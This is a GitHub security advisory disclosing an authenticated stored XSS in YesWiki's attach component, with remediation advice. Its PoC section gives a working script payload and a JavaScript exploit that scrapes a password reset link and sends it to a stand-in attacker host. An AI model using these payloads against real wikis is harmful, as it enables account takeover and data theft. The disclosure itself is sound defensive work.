# [H] Authenticated Stored XSS in YesWiki

## Summary
Severity: High
Advisory: GHSA-w59h-3x3q-3p6j
CVE: CVE-2025-24018
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:L (CVSS_V3)
Published: 2025-01-21
Source: https://github.com/advisories/GHSA-w59h-3x3q-3p6j
Type: github-advisory

## Affected
- Packagist: `yeswiki/yeswiki` — affected >=0 <4.5.0

## Details
# Authenticated Stored XSS in YesWiki <= 4.4.5

### Summary
It is possible for an authenticated user with rights to edit/create a page or comment to trigger a stored XSS which will be reflected on any page where the resource is loaded.

This Proof of Concept has been performed using the followings:
- YesWiki v4.4.5 (`doryphore-dev` branch, latest)
- Docker environnment (`docker/docker-compose.yml`)
- Docker v27.5.0
- Default installation

### Details
The vulnerability makes use of the content edition feature and more specifically of the `{{attach}}` component allowing users to attach files/medias to a page. When a file is attached using the `{{attach}}` component, if the resource contained in the `file` attribute doesn't exist, then the server will generate a file upload button containing the filename. 

This part of the code is managed in `tools/attach/libs/attach.lib.php` and the faulty function is **[showFileNotExits()](https://github.com/YesWiki/yeswiki/blob/doryphore-dev/tools/attach/libs/attach.lib.php#L660)**.

```php
public function showFileNotExits()
{
    echo '<a href="' . $this->wiki->href('upload', $this->wiki->GetPageTag(), "file=$this->file") . '" class="btn btn-primary"><i class="fa fa-upload icon-upload icon-white"></i> ' . _t('UPLOAD_FILE') . ' ' . $this->file . '</a>';
}
```

The file name attribute is not properly sanitized when returned to the client, therefore allowing the execution of malicious JavaScript code in the client's browser.

### PoC
#### 1. Simple XSS
Here is a working payload `{{attach file="<script>alert(document.domain)</script>" desc="" size="original" class=" whiteborder zoom" nofullimagelink="1"}}` tha works in pages and comments:

On a comment:

![poc1](https://github.com/user-attachments/assets/dab6b08e-f542-41fd-872d-d221fd228229)
![poc2](https://github.com/user-attachments/assets/50eff326-df36-482b-be87-c4e3866497cf)


On a page:

![poc3](https://github.com/user-attachments/assets/e9f4761a-6b7d-4508-aad5-21d4cedcd179)
![poc4](https://github.com/user-attachments/assets/7945b9bb-bc8e-4e01-86d7-bbba823ba67c)

#### 2. Full account takeover scenario
By changing the payload of the XSS it was possible to establish a full acount takeover through a weak password recovery mechanism abuse ([CWE-460](https://cwe.mitre.org/data/definitions/640.html)). The following exploitation script allows an attacker to extract the password reset link of every logged in user that is triggered by the XSS:

```javascript
fetch('/?ParametresUtilisateur')
  .then(response => {
    return response.text();
  })
  .then(htmlString => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(htmlString, 'text/html');
    const resetLinkElement = doc.querySelector('.control-group .controls a'); //dirty
    fetch('http://attacker.lan:4444/?xss='.concat(btoa(resetLinkElement.href)));
  })
```

Posting a comment using this specially crafted payload with a user account:

![poc5](https://github.com/user-attachments/assets/7c143b99-a81e-4834-9453-5be067e19521)

Allows our administrator account's password reset link to be sent to the listener of the attacker:

![poc7](https://github.com/user-attachments/assets/bbf8c3e2-22a6-4a57-bc32-d6ca2e619cb9)
![poc8](https://github.com/user-attachments/assets/18d5cb6e-5085-4a87-91db-2afebf40c60a)

Therefore giving us access to an successful password reset for any account triggering the XSS:

![poc9](https://github.com/user-attachments/assets/7e237b92-0bec-4754-b65c-59f70c010ef4)

### Impact
This vulnerability allows any malicious authenticated user that has the right to create a comment or edit a page to be able to steal accounts and therefore modify pages, comments, permissions, extract user data (emails), thus impacting the integrity, availabilty and confidentiality of a YesWiki instance.

### Suggestion of possible corrective measures
- Sanitize properly the filename attribute

```php
public function showFileNotExits()
{
    $filename = htmlspecialchars($this->file);
    echo '<a href="' . $this->wiki->href('upload', $this->wiki->GetPageTag(), "file=$filename") . '" class="btn btn-primary"><i class="fa fa-upload icon-upload icon-white"></i> ' . _t('UPLOAD_FILE') . ' ' . $filename . '</a>';
}
```

- Implement a stronger password reset mechanism through:
  + Not showing a password reset link to an already logged-in user. 
  + Generating a password reset link when a reset is requested by a user, and only send it by mail.
  + Add an expiration/due date to the token

- Implement a strong Content Security Policy to mitigate other XSS sinks (preferably using a random nonce)
> The latter idea is expensive to develop/implement, but given the number of likely sinks allowing Cross Site Scripting in the YesWiki source code, it seems necessary and easier than seeking for any improperly sanitized user input.

## References
- https://github.com/YesWiki/yeswiki/security/advisories/GHSA-w59h-3x3q-3p6j
- https://nvd.nist.gov/vuln/detail/CVE-2025-24018
- https://github.com/YesWiki/yeswiki/commit/c1e28b59394957902c31c850219e4504a20db98b
- https://github.com/YesWiki/yeswiki
- https://github.com/YesWiki/yeswiki/blob/v4.4.5/tools/attach/libs/attach.lib.php#L660
